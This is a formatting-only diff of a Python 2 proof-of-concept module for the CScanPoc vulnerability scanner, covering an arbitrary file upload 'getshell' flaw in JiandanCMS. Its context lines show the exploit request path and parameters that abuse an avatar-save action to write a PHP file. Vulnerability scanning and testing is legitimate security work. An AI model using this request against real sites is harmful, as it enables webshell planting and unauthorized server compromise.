@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'JiandanCMS_0001_p' # 平台漏洞编号，留空
+    vuln_id = 'JiandanCMS_0001_p'  # 平台漏洞编号，留空
     name = '简单CMS Getshell'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2013-10-30'  # 漏洞公布时间
     desc = '''
         简单CMS 可上传任意文件导致getshell.
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'JiandanCMS(简单CMS)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '59a38229-515b-4bea-8a1a-c7adec08b17b'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #根据实际环境payload可能不同
+
+            # 根据实际环境payload可能不同
             s = requests.session()
             payload = '/jd/index.php'
             parms = '?a=saveAvatar&m=Uc&g=Home&id=1&photoServer=c.php&type=ig'
@@ -52,8 +54,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #根据实际环境payload可能不同
+
+            # 根据实际环境payload可能不同
             s = requests.session()
             payload = '/jd/index.php'
             parms = '?a=saveAvatar&m=Uc&g=Home&id=1&photoServer=c.php&type=ig'
@@ -70,6 +72,7 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
